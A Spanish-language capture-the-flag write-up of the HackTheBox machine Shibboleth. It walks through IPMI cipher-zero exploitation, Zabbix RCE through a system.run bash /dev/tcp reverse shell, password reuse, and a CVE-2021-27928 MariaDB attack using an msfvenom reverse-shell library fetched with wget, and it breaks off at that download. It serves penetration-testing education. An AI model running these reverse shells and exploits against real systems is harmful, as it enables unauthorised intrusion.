---
title: Shibboleth WriteUp
date: 2023-05-23
categories: [WriteUps, Máquinas Linux]
tags: [UDP]
image:
  path: ../../assets/img/writeups/Shibboleth/shibboleth.png
  width: 528
  height: 340
  alt: Banner Shibboleth
---

Hoy traigo la máquina Shibboleth. Si alguien lee esto espero que les sirva de ayuda. Escaneando puertos por TCP (por defecto) encuentro puerto 80. Haciendo fuzzing de subdirectorios encuentro tres, que son lo mismo, son la página de panel de inicio de sesión de servicio **Zabbix**. No tengo credenciales para acceder así que tengo que buscar otras vías.  
Realizo un escaneo por UDP y encuentro el **puerto 623** buscando por hacktricks este puerto parece estar relacionado con servicio IPMI-Intelligent Platform Management Interface-. Sigo los pasos de hacktricks y parece que es vulnerable. Busco por internet algún exploit para esa vuln y la encuentro en github. Consigo una contraseña mediante este exploit que da acceso al panel de Zabbix. Dentro de él hay una forma de conseguir RCE y obtenemos una reverse shell.

Reciclamos la contraseña encontrada antes y escalamos al usuario ipmi-svc. Para escalar a root nos aprovechamos del archivo de configuración de zabbix; **zabbix_sercer.conf**. Obenemos de aquí credenciales a base de datos. Accedemos a ella y resulta que la versión de mariadb es vulnerable.

## Reconocimiento

Hoy haremos un pentesting de la máquina `Shibboleth` con ip `10.10.11.124` lo primero es comprobar que hay conexión con ella:
```
❯ ping -c 1 10.10.11.124
PING 10.10.11.124 (10.10.11.124) 56(84) bytes of data.
64 bytes from 10.10.11.124: icmp_seq=1 ttl=63 time=43.0 ms

--- 10.10.11.124 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.037/43.037/43.037/0.000 ms
```
Un paquete enviado, un paquete recibido, hay conectividad.

Para entrar por algún lado a la máquin objetivo hay que realizar un escaneo de los puertos, vamos a ello:
``` 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.124 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-22 10:37 CEST
Initiating SYN Stealth Scan at 10:37
Scanning 10.10.11.124 [65535 ports]
Discovered open port 80/tcp on 10.10.11.124
Completed SYN Stealth Scan at 10:37, 12.09s elapsed (65535 total ports)
Nmap scan report for 10.10.11.124
Host is up, received user-set (0.044s latency).
Scanned at 2023-05-22 10:37:05 CEST for 12s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.28 seconds
           Raw packets sent: 66171 (2.912MB) | Rcvd: 65574 (2.623MB)
```
Esto significan las opciones:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.11.124 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts : Exportará el output a un fichero grepeable que llamaremos "allPorts"

Parece ser que solo hay un puerto abierto por TCP, el puerto 80/http. Ahora escaneo ese puerto con algo más de profundidad con una serie de scripts de nmap:
```
❯ nmap -p80 -sC -sV 10.10.11.124 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-22 10:40 CEST
Nmap scan report for 10.10.11.124
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb
```
* -sC : Lanza unos scrips básicos de reconocimiento.
* -sV : Para averiguar la versión de los servicios.

Parece que el servidor que aloja la web es Apache y que nos redirecciona a un dominio llamado shibboleth.htb. Posiblemente la ip tenga opción de virtual hosting, es decir, de tener varias páginas web en una misma ip, entonces para llegar a un dominio en concreto hay que relacionar esa ip con el dominio, ¿cómo?, añadiendolo en el fichero **/etc/hosts**:
``` 
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot

10.10.11.124  shibboleth.htb

::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
``` 

## Buscando vulnerabilidades

Antes de entrar al navegador usaré la herramienta whatweb desde terminal para ver las tecnologías que corren por detrás de la web.
```
❯ whatweb http://10.10.11.124
http://10.10.11.124 [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.124], RedirectLocation[http://shibboleth.htb/], Title[302 Found]
http://shibboleth.htb/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@example.com,info@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.124], Lightbox, PoweredBy[enterprise], Script, Title[FlexStart Bootstrap Template - Index]

❯ whatweb http://shibboleth.htb
http://shibboleth.htb [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@example.com,info@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.124], Lightbox, PoweredBy[enterprise], Script, Title[FlexStart Bootstrap Template - Index]
```
Lo visto con anterioridad, al poner la ip nos redirecciona al dominio.  
Veamos desde navegador como se ve.

![Web]({{ 'assets/img/writeups/Shibboleth/web.png' | relative_url }}){: .center-image }

Veo una sección de contactos donde hay opción de input, un buscador en la parte de "Blog" y algunos nombres de empleados. Voy a dejar esto por el momento y realizaré un fuzzing de subdirectorios y subdominios.  
Empezaré esta vez por subdominios:
``` 
> gobuster vhost -u http://shibboleth.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 150

Found: tomcat.shibboleth.htb (Status: 302) [Size: 293]                        
Found: s16.shibboleth.htb (Status: 302) [Size: 290]                           
Found: slave.shibboleth.htb (Status: 302) [Size: 292]                         
Found: webdisk.wiki.shibboleth.htb (Status: 302) [Size: 299]                  
Found: shark.shibboleth.htb (Status: 302) [Size: 292]                         
Found: www.love.shibboleth.htb (Status: 302) [Size: 295]                      
Found: autoconfig.cdn.shibboleth.htb (Status: 302) [Size: 301]                
Found: quantum.shibboleth.htb (Status: 302) [Size: 294]                       
Found: e1.shibboleth.htb (Status: 302) [Size: 289]                            
Found: tornado.shibboleth.htb (Status: 302) [Size: 294]                       
Found: backup3.shibboleth.htb (Status: 302) [Size: 294]                       
Found: keys.shibboleth.htb (Status: 302) [Size: 291]                          
Found: youth.shibboleth.htb (Status: 302) [Size: 292]                         
Y sigue .....
```
302 es un redirección si añades la opción **-r** en gobuster seguirá la redirección y obtendrás el mismo resultado que voy a obtener desde wfuzz ocultando los codigos 302:
```
❯ wfuzz -c --hc=404,302 -t 150 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "HOST:FUZZ.shibboleth.htb" http://shibboleth.htb

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shibboleth.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000346:   200        29 L     219 W      3687 Ch     "monitoring - monitoring"                                                                                              
000000390:   200        29 L     219 W      3687 Ch     "zabbix - zabbix"                                                                                                      
000000099:   200        29 L     219 W      3687 Ch     "monitor - monitor"
```
Añado esos subdominios al /etc/host y probemos.
```
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot

10.10.11.124  shibboleth.htb  monitoring.shibboleth.htb  monitor.shibboleth.htb  zabbix.shibboleth.htb
```
En cualquiera de los tres sudominios encuentro un panel de acceso, parece que hay un programa llamado **Zabbix** que lo corre.

![Subdominio]({{ 'assets/img/writeups/Shibboleth/subdominio.png' | relative_url }}){: .center-image }

¿Qué es Zabbix?. Zabbix es un Sistema de Monitorización de Redes creado por Alexei Vladishev. Está diseñado para monitorizar y registrar el estado de varios servicios de red, Servidores, y hardware de red. Usa MySQL, PostgreSQL, SQLite, Oracle o IBM DB2 como base de datos.  
¿Hay vulnerabilidades en Zabbix?. Haciendo un `searchsploit Zabbix` encontramos bastantes. Así que de momento voy a seguir por aquí.

Recuerda: Si no conseguimos nada por esta vía aun nos queda hacer fuzzing de subdirectorios y probar inyecciones en algunos cuadros de la web.

Estaría muy bien saber que versión es la que tiene Zabbix. Entrando en el código fuente de la propia página `ctrl + u` y buscando por Zabbix hay varias coincidencias hasta que encuentro una que me da un pista de la posible versión que corre:

![Versión]({{ 'assets/img/writeups/Shibboleth/version.png' | relative_url }}){: .center-image }

Parece que estamos en la versión 5.0.0, para esta versión y otras más recientes tenemos estas vulnerabilidades, vía searchsploit:  
+ Zabbix 5.0.0 - Stored XSS via URL Widget Iframe
+ Zabbix 5.0.17 - Remote Code Execution (RCE) (Authenticated)  
Si conseguimos estar autenticados tendríamos posibilidad de tener RCE y ,si funciona, lanzarnos una reverse shell para entrar a la máquina objetivo.

Probamos por credenciales por defecto. Leo por el internete que para la versión 5.0 las credenciales por defecto son admin como usuario y zabbix como password, pero nada. También pruebo admin como user y contraseña vacia, pero tampoco, entre otras.

Vuelvo al dominio principal y al "recuerda" que puse antes. Empecemos por el fuzzing a subdirectorios y sigamos con los inputs de usuario de la web.
```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shibboleth.htb/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shibboleth.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   200        1323 L   4114 W     59474 Ch    "# directory-list-2.3-medium.txt"                                                                                      
000000003:   200        1323 L   4114 W     59474 Ch    "# Copyright 2007 James Fisher"                                                                                        
000000007:   200        1323 L   4114 W     59474 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                      
000000014:   200        1323 L   4114 W     59474 Ch    "http://shibboleth.htb/"                                                                                               
000000011:   200        1323 L   4114 W     59474 Ch    "# Priority ordered case-sensitive list, where entries were found"                                                     
000000009:   200        1323 L   4114 W     59474 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                                                  
000000012:   200        1323 L   4114 W     59474 Ch    "# on at least 2 different hosts"                                                                                      
000000013:   200        1323 L   4114 W     59474 Ch    "#"                                                                                                                    
000000008:   200        1323 L   4114 W     59474 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                                                           
000000010:   200        1323 L   4114 W     59474 Ch    "#"                                                                                                                    
000000291:   301        9 L      28 W       317 Ch      "assets"                                                                                                               
000000361:   301        9 L      28 W       316 Ch      "forms"
```
Encontramos los subdirectorios assets y forms.  
Nada me resulta intersante. Lo único que puedo deducir es que la sección de contacto de la página te va a lanzar una respuesta fija a lo que pongas, que es "Unable to load the "PHP Email Form" Library!".

Haremos fuzzing por extensiones php y txt.
```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt http://shibboleth.htb/FUZZ.FUZ2Z

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shibboleth.htb/FUZZ.FUZ2Z
Total requests: 441120

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   200        1323 L   4114 W     59474 Ch    "# directory-list-2.3-medium.txt - php"                                                                                                                                                                            000000006:   200        1323 L   4114 W     59474 Ch    "# Copyright 2007 James Fisher - txt"                                                                                  
000000008:   200        1323 L   4114 W     59474 Ch    "# - txt"                                                                                                              
000000019:   200        1323 L   4114 W     59474 Ch    "# - php"                                                                                                              
000000021:   200        1323 L   4114 W     59474 Ch    "# Priority ordered case-sensitive list, where entries were found - php"                                               
000000018:   200        1323 L   4114 W     59474 Ch    "# Suite 300, San Francisco, California, 94105, USA. - txt"                                                            
000000003:   200        1323 L   4114 W     59474 Ch    "# - php"                                                                                                              
000000014:   200        1323 L   4114 W     59474 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/ - txt"                                                
000000012:   200        1323 L   4114 W     59474 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this - txt"                                                  
000000011:   200        1323 L   4114 W     59474 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this - php"                                                  
000000017:   200        1323 L   4114 W     59474 Ch    "# Suite 300, San Francisco, California, 94105, USA. - php"                                                            
000000009:   200        1323 L   4114 W     59474 Ch    "# This work is licensed under the Creative Commons - php"                                                                             
000000005:   200        1323 L   4114 W     59474 Ch    "# Copyright 2007 James Fisher - php"                                                                                  
000000004:   200        1323 L   4114 W     59474 Ch    "# - txt"                                                                                                              
000000022:   200        1323 L   4114 W     59474 Ch    "# Priority ordered case-sensitive list, where entries were found - txt"                                               
000000027:   403        9 L      28 W       279 Ch      "php"                                                                                                                  
000000026:   200        1323 L   4114 W     59474 Ch    "# - txt"                                                                                                              
000002536:   200        15 L     71 W       499 Ch      "changelog - txt"                                                                                                      
000070954:   200        6 L      15 W       218 Ch      "Readme - txt"                                                                                                         
000090479:   403        9 L      28 W       279 Ch      "php"  
```
Y encuentra changelog.txt (registro de cambios) y Readme.txt.  
En el chagelog.txt tenemos esto:
```
Version: 1.2.0
  - Updated Bootstrap to version 5.0.0-beta3
  - Updated all outdated third party vendor libraries to their latest versions
  - Updated the PHP Email Form to V3.1

Version: 1.1.1
  - Updated Bootstrap to version 5.0.0-beta2
  - Updated all outdated third party vendor libraries to their latest versions

Version: 1.1.0
  - Added custom navbar links active on scroll functionality
  - Small fixes and imrovements in assets/js/main.js

Version: 1.0.0
  - Initial Release
```
Y en el Readme.txt:
```
Thanks for downloading this template!

Template Name: FlexStart
Template URL: https://bootstrapmade.com/flexstart-bootstrap-startup-template/
Author: BootstrapMade.com
License: https://bootstrapmade.com/license/
```
Busco si bootstrap 5.0.0 es vulnerable pero no lo parece, por lo demás nada..

Inicio burpsuite e intercepto la petición del formulario de contacto. Como encuentro la cabecera Referer le meto mi ip, abriendome previamente un servidor en python; `pyhon3 -m http.server 80`. No me llega ninguna petición a mi servidor.  
También intercepto la petición de suscripción al newsletter e intento meter inyecciones en el campo email pero nada. Parace esar todo sin modificar desde la plantilla web que se descargarían.

En este punto podríamos hacer un escaneo de subdirectorios dentro del subdominio, pero adelanto que no hay nada. No quiero poner tanto fuzzing en el writeup.  
También podríamos hacer un escaneo de puertos por UDP, ya.. no es lo normal, pero si no tienes nada es lo único que tienes. Escaneamos por UDP:
```
❯ nmap --top-ports 500 -sU --open -T5 -v -n 10.10.11.124 -oN portsUDP

Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-23 09:51 CEST
Initiating Ping Scan at 09:51
Scanning 10.10.11.124 [4 ports]
Completed Ping Scan at 09:51, 0.07s elapsed (1 total hosts)
Initiating UDP Scan at 09:51
Scanning 10.10.11.124 [500 ports]
Warning: 10.10.11.124 giving up on port because retransmission cap hit (2).
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 55.13% done; ETC: 09:51 (0:00:09 remaining)
Increasing send delay for 10.10.11.124 from 0 to 50 due to 11 out of 18 dropped probes since last increase.
Discovered open port 623/udp on 10.10.11.124
Increasing send delay for 10.10.11.124 from 50 to 100 due to 11 out of 18 dropped probes since last increase.
Completed UDP Scan at 09:52, 53.74s elapsed (500 total ports)
Nmap scan report for 10.10.11.124
Host is up (0.044s latency).
Not shown: 441 open|filtered udp ports (no-response), 58 closed udp ports (port-unreach)
PORT    STATE SERVICE
623/udp open  asf-rmcp
```
Opciones diferentes a explicar:
+ --top-ports 500: Solo escaneo los 500 puertos más comunes. Lo realizo porque por UDP suele tardar bastante tiempo escanear todos.
+ sU: Escaneo por UDP. Sin opciones por defecto te hace un escaner por TCP.

Encontramos el puerto 623 abierto con un servicio llamado asf-rmcp. Recomiendo fuertemente que cuando no tengas ni idea de para que es un puerto lo busques, por google si, y en la página **hacktrick** porque te dará ideas de como explotarlo.

Parece que el puerto esta relacionado con **IPMI**-Inteligent Platform Management Interface-. Es un conjunto de especificaciones estandarizadas para sistemas de gestión de host basados en hardware que se utilizan para la gestión y monitorización de sistemas.

Nos señalan desde hacktricks que podemos averiguar la versión usando, entiendo, un programa de nmap llamado ipmi-version. Busquemos por ipmi:
```
❯ locate .nse | grep "ipmi"
/usr/share/nmap/scripts/ipmi-brute.nse
/usr/share/nmap/scripts/ipmi-cipher-zero.nse
/usr/share/nmap/scripts/ipmi-version.nse
/usr/share/nmap/scripts/supermicro-ipmi-conf.nse
```
Y ahí está. Lanzemos el script:
```
❯ nmap --script ipmi-version -sU -p623 10.10.11.124 -oN versionIpmi
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-23 10:10 CEST
Nmap scan report for shibboleth.htb (10.10.11.124)
Host is up (0.043s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version: 
|   Version: 
|     IPMI-2.0
|   UserAuth: password, md5, md2, null
|   PassAuth: auth_msg, auth_user, non_null_user
|_  Level: 1.5, 2.0

Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```
Es la versión 2.0. Parece que en esta versión (sale justo después en hacktricks) hay una vulnerabilidad de Authentication Bypass via Cipher 0. Más arriba vimos también ese script de nmap, que debe ser un checker (solo te dice si es vulnerable o no). Lancemoslo:
```
❯ nmap --script ipmi-cipher-zero -sU -p 623 10.10.11.124 -oN isvulnornot

Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-23 10:15 CEST
Nmap scan report for shibboleth.htb (10.10.11.124)
Host is up (0.044s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-cipher-zero: 
|   VULNERABLE:
|   IPMI 2.0 RAKP Cipher Zero Authentication Bypass
|     State: VULNERABLE
|     Risk factor: High
|       
|       The issue is due to the vendor shipping their devices with the
|       cipher suite '0' (aka 'cipher zero') enabled. This allows a
|       remote attacker to authenticate to the IPMI interface using
|       an arbitrary password. The only information required is a valid
|       account, but most vendors ship with a default 'admin' account.
|       This would allow an attacker to have full control over the IPMI
|       functionality
```
Y es vulnerable!!. 

## Explotación

Leyendo en la página de hacktricks parece que hay que instalarse ipmitool. Desde mi parrot:
```
> apt-get install ipmitool
``` 
Probemos si funciona:
```
❯ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U root -P root user list
Error: Unable to establish IPMI v2 / RMCP+ session
```
Parece que da error. Si leemos bien nos comenta que la opción -C 0 es para que cualquier contraseña sea aceptada, pero no dice del usuario, con este quizás habría que acertar uno que exista. Probemos con el usuario Administrator:
```
❯ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P root user list
ID  Name	    Callin  Link Auth	IPMI Msg   Channel Priv Limit
1                    true    false      false      USER
2   Administrator    true    false      true       USER
3                    true    false      false      Unknown (0x00)
4                    true    false      false      Unknown (0x00)
5                    true    false      false      Unknown (0x00)
6                    true    false      false      Unknown (0x00)
7                    true    false      false      Unknown (0x00)
8                    true    false      false      Unknown (0x00)
```
Funciona. Hemos lanzado el comando user list. Me gustaría lanzarme una reverse shell. Busco por internete, fuera ya de hacktricks. Si buscas **ipmi exploit github** encuentras un exploit de un conocido de la comunidad del maestro s4viar, hablo de c0rnf13ld.
```
❯ git clone https://github.com/c0rnf13ld/ipmiPwner
Clonando en 'ipmiPwner'...
remote: Enumerating objects: 40, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 40 (delta 18), reused 26 (delta 14), pack-reused 7
Recibiendo objetos: 100% (40/40), 18.12 KiB | 6.04 MiB/s, listo.
Resolviendo deltas: 100% (18/18), listo.

❯ ls
total 0
drwxr-xr-x 1 root root 122 may 23 10:59 ipmiPwner
❯ cd ipmiPwner
❯ ls
total 24K
drwxr-xr-x 1 root root   18 may 23 10:59 bashVersion
-rwxr-xr-x 1 root root  11K may 23 10:59 ipmipwner.py
-rwxr-xr-x 1 root root 3,4K may 23 10:59 rakpcrk.py
-rw-r--r-- 1 root root 1,9K may 23 10:59 README.md
-rwxr-xr-x 1 root root  470 may 23 10:59 requirements.sh
```
``` sh
❯ cat requirements.sh
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: requirements.sh

   1   │ #!/bin/bash
   2   │ 
   3   │ if [ "$(id -u)" -ne 0 ]; then
   4   │     echo -e "\n[*] You must be root to run the script"
   5   │     exit
   6   │ fi
   7   │ 
   8   │ function ctrl_c(){
   9   │     tput cnorm
  10   │     echo -e "\n\n[*] Exiting...\n"
  11   │     exit
  12   │ }
  13   │ 
  14   │ trap ctrl_c int
  15   │ tput civis; echo -ne "\n\n[*] Installing requirements\n\n"
  16   │ apt-get install ipmitool nmap python3 python3-pip -y
  17   │ echo -ne "\n\n[*] Installing python3 requirements\n\n"
  18   │ pip3 install shodan colorama python-nmap
  19   │ echo -ne "\n\n[*] All requirements have been installed\n"; tput cnorm
```
De los requirimientos solo me quedaría instalar shodan, colorama y ptyhon-nmap:
```
❯ pip3 install shodan colorama python-nmap

Requirement already satisfied: shodan in /usr/lib/python3/dist-packages (1.25.0)
Requirement already satisfied: colorama in /usr/lib/python3/dist-packages (0.4.4)
Collecting python-nmap
  Downloading python-nmap-0.7.1.tar.gz (44 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 44.4/44.4 kB 8.5 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
Building wheels for collected packages: python-nmap
  Building wheel for python-nmap (setup.py) ... done
  Created wheel for python-nmap: filename=python_nmap-0.7.1-py2.py3-none-any.whl size=20634 sha256=07ce49674258db420cf023eb9eb6b353b21ad50a20c0b92324dcddc0a2c627a5
  Stored in directory: /root/.cache/pip/wheels/88/67/41/ba1f1a09d56b70beff41ba89b22cf581796d30996762c5c718
Successfully built python-nmap
Installing collected packages: python-nmap
Successfully installed python-nmap-0.7.1
```
Ahora ya deberíamos poder ejecutar el script. Abajo del mismo github nos pone formas de correr la herramienta, me copio la primera y modifico un poco.
```
❯ python3 ipmipwner.py --host 10.10.11.124 -c python -oH hash -pW /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt

[*] Checking if port 623 for host 10.10.11.124 is active
[*] Using the list of users that the script has by default
[!] To use python cracking mode you must provide the --output-cracked parameter.
```
Parece que hay que añadir la opción que nos indican al final
```
❯ python3 ipmipwner.py --host 10.10.11.124 -c python -oH hash -pW /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --output-cracked hashcrackeado
```
Mi ordenador,que es viejo, colapso de la fuerza bruta. Pero el script funciona. La contraseña que saca es; ilovepumkinpie1  
Entonces tenemos un usuario que es **Administrator** y una contraseña que es **ilovepumkinpie1**. Y tenemos un panel, el panel de Zabbix. Añadiendo esas credenciales consigo entrar.

![Panel]({{ 'assets/img/writeups/Shibboleth/panel.png' | relative_url }}){: .center-image }

Si recuerdas vimos haciendo `searchsploit zabbix` que había un exploit de RCE si estabamos autenticados. Podemos usarlo o también hacerlo manualmente, es fácil, sobretodo si lo tienes en video(video de s4vitar en youtube para esta misma máquina).

¿Cómo se hace?. Vamos a Configuration--> Hosts--> Items(en pequeñito y en azul, parte media)--> Create item --> En Key elegir la de system.run[command,<mode>].
En mode señala que hay que poner nowait. En commando una reverse shell estaría bien, así que puede quedar algo así:  
system.run[bash -c "bash -i >& /dev/tcp/10.10.14.14/443 0>&1",nowait]

Antes de seguir nos ponemos en escucha por el puerto 443.
```
❯ nc -nlvp 443
listening on [any] 443 ...
```
Ahora añadiendo la linea anterior le damos abajo al boton de "Test" y luego "Get value and test". Obteniendo la reverse shell:
```
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.124] 40612
bash: cannot set terminal process group (935): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@shibboleth:/$ 
```
Toca realizar el tratamiento de la consola.
```
zabbix@shibboleth:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
zabbix@shibboleth:/$ ^Z
zsh: suspended  nc -nlvp 443
``` 
Saldrá a mi terminal local, y:
```
> stty raw -echo; fg
        reset xterm
```
Vuelve a la terminal remota:
``` 
zabbix@shibboleth:/$ export TERM=xterm
zabbix@shibboleth:/$ export SHELL=bash
zabbix@shibboleth:/$ stty rows 38 columns 186
```
Y leemos la flag del usuario:
```
zabbix@shibboleth:/$ cat user.txt
zabbix@shibboleth:/$ c45880f9017d63709580*******
```

## Escalada de privilegios 

```
zabbix@shibboleth:/$ whoami
zabbix
zabbix@shibboleth:/$ pwd
/
zabbix@shibboleth:/$ cd /home
zabbix@shibboleth:/home$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Oct 16  2021 .
drwxr-xr-x 19 root     root     4096 Oct 16  2021 ..
drwxr-xr-x  3 ipmi-svc ipmi-svc 4096 Oct 16  2021 ipmi-svc
```
Somos el usuario zabbix pero no tenemos ni un home. En cambio hay otro usuario con directorio home, lo que me lleva a pensar que hay que escalar a él. Si recuerdas tenemos una contraseña. ¡IMPORTANTE!; Recuerda las contraseñas que tienes para reciclarlas para otros usuarios y servicios. Tenemos la contraseña ilovepumkinpie1, probemos:
```
zabbix@shibboleth:/home$ su ipmi-svc
Password: 
ipmi-svc@shibboleth:/home$ whoami
ipmi-svc
```
Funciona. Ahora hay que escalar a root.

Esta vez en vez de hacer lo de siempre, el procedimiento típico para buscar vías de escalada, voy a ir al grano. Siguiendo el procedimiento típico hubieramos llegado en la parte de buscar mediante find archivos de configuración. Como hay un zabbix corriendo podemos pensar que tiene algún fichero de configuración.
```
ipmi-svc@shibboleth:/$ find \-name zabbix 2>/dev/null
./var/lib/mysql/zabbix
./var/log/zabbix
./run/zabbix
./etc/zabbix
./usr/share/zabbix
./usr/lib/zabbix

ipmi-svc@shibboleth:/$ ls -l /etc/zabbix
total 92
-r-------- 1 zabbix   zabbix      33 Apr 24  2021 peeesskay.psk
drwxr-xr-x 2 www-data root      4096 Apr 27  2021 web
-rw-r--r-- 1 root     root     15317 May 25  2021 zabbix_agentd.conf
-rw-r--r-- 1 root     root     15574 Oct 18  2021 zabbix_agentd.conf.dpkg-dist
drwxr-xr-x 2 root     root      4096 Apr 27  2021 zabbix_agentd.d
-rw-r----- 1 root     ipmi-svc 21863 Apr 24  2021 zabbix_server.conf
-rw-r----- 1 root     ipmi-svc 22306 Oct 18  2021 zabbix_server.conf.dpkg-dist
```
El fichero `zabbix_server.conf` podría ser interesante.
```
ipmi-svc@shibboleth:/$ cat /etc/zabbix/zabbix_server.conf | grep password -C 8
#
# Mandatory: no
# Default:
# DBUser=

DBUser=zabbix

### Option: DBPassword
#	Database password.
#	Comment this line if no password is used.
#
# Mandatory: no
# Default:
DBPassword=bloooarskybluh

### Option: DBSocket
#	Path to MySQL socket.
```
Y tenemos claves de acceso para la base de datos:  
User: zabbix
Password: bloooarskybluh

Nos conectamos a la base de datos:
```
ipmi-svc@shibboleth:/$ mysql -uzabbix -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1660
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```
Lo lógico ahora sería sacar hashes de la base de datos para averiguar las contraseñas. Adelanto que encontramos hashes pero no se pueden crackear. Otra cosa muy lógica que, al menos yo, hago menos cuando entro a una base de datos es fijarme en la versión que corre:
```
MariaDB [(none)]> status
--------------
mysql  Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2

Connection id:		1660
Current database:	
Current user:		zabbix@localhost
SSL:			Not in use
Current pager:		stdout
Using outfile:		''
Using delimiter:	;
Server:			MariaDB
Server version:		10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
Protocol version:	10
Connection:		Localhost v
```
Busco en internet `mariadb 10.3.25 exploit` y el primer resultado, o de los primeros, está página de github; CVE-2021-27928 MariaDB/MySQL-'wsrep provider'.  
Abro y sigo los pasos. El primero es crearnos una reverse shell:
```
❯ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f elf-so -o CVE-2021-27928.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: CVE-2021-27928.so
```
Paso el script al objetivo. Creo en local un servidor en python en la misma carpeta que tengo la reverse:
```
> python3 -m http.server 80
```
Y desde máquina objetivo:
``` 
ipmi-svc@shibboleth:/$ cd /tmp
ipmi-svc@shibboleth:/tmp$ wget http://10.10.14.14/CVE-2021-27928.so
--2023-05-23 11:54:12--  http://10.10.14.14/CVE-2021-27928.so
Connecting to 10.10.14.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 476 [application/octet-stream]
Saving to: ‘CVE-2021-27928.so’

